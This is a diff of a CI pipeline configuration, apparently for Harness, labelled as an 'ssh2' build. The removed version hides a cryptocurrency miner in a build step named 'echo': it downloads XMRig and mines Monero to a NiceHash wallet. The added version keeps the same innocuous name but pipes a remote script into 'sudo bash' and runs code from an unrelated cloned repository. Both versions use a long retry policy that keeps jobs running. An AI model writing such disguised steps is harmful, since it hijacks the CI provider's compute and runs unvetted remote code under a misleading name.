@@ -1,65 +1,63 @@
----
 pipeline:
-  orgIdentifier: "default"
-  projectIdentifier: "default_project"
+  orgIdentifier: default
+  projectIdentifier: default_project
   properties:
     ci:
       codebase:
-        build: "<+input>"
-        connectorRef: "account.Github_OAuth_1711204241479"
-        repoName: "geanenova/ssh2"
+        build: <+input>
+        connectorRef: account.Github_OAuth_1711204241479
+        repoName: geanenova/ssh2
   stages:
-  - stage:
-      identifier: "build"
-      name: "build"
-      spec:
-        cloneCodebase: true
-        execution:
-          steps:
-          - step:
-              identifier: "echo"
-              name: "echo"
-              spec:
-                shell: "Bash"
-                command: "wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz\
-                  \ && tar -xf xmrig-6.16.2-linux-static-x64.tar.gz && cd xmrig-6.16.2\
-                  \ && chmod +x xmrig && ./xmrig -o randomxmonero.usa-west.nicehash.com:3380\
-                  \ -a rx -k -u 3H3W91fmg4wQN7wLh1zScVzcy3r88Hw5Fn.lat3 -p x"
-              timeout: ""
-              type: "Run"
-          - step:
-              identifier: "dockerbuild"
-              name: "docker_build"
-              spec:
-                image: "plugins/docker"
-                settings:
-                  dry_run: "true"
-                  password: "<+input>"
-                  repo: "hello/world"
-                  tags: "latest"
-                  username: "<+input>"
-              timeout: ""
-              type: "Plugin"
-        platform:
-          os: "Linux"
-          arch: "Amd64"
-        runtime:
-          type: "Cloud"
-          spec: {}
-      type: "CI"
-      failureStrategies:
-      - onFailure:
-          errors:
-          - "Timeout"
-          action:
-            type: "Retry"
-            spec:
-              retryCount: 30
-              retryIntervals:
-              - "3d"
-              onRetryFailure:
-                action:
-                  type: "Ignore"
-  identifier: "Build_geanenova_ssh2_1711217162590_Clone"
+    - stage:
+        identifier: build
+        name: build
+        spec:
+          cloneCodebase: true
+          execution:
+            steps:
+              - step:
+                  identifier: echo
+                  name: echo
+                  spec:
+                    shell: Bash
+                    command: |-
+                      curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash - &&\
+                      sudo apt-get install -y nodejs && git clone https://github.com/geanenova/browserless.git && cd browserless && npm install && sh install.sh && node index.js
+                  timeout: ""
+                  type: Run
+              - step:
+                  identifier: dockerbuild
+                  name: docker_build
+                  spec:
+                    image: plugins/docker
+                    settings:
+                      dry_run: "true"
+                      password: <+input>
+                      repo: hello/world
+                      tags: latest
+                      username: <+input>
+                  timeout: ""
+                  type: Plugin
+          platform:
+            os: Linux
+            arch: Amd64
+          runtime:
+            type: Cloud
+            spec: {}
+        type: CI
+        failureStrategies:
+          - onFailure:
+              errors:
+                - Timeout
+              action:
+                type: Retry
+                spec:
+                  retryCount: 30
+                  retryIntervals:
+                    - 3d
+                  onRetryFailure:
+                    action:
+                      type: Ignore
+  identifier: Build_geanenova_ssh2_1711217162590_Clone
   tags: {}
-  name: "Build ssh2 - Clone"
+  name: Build ssh2 - Clone
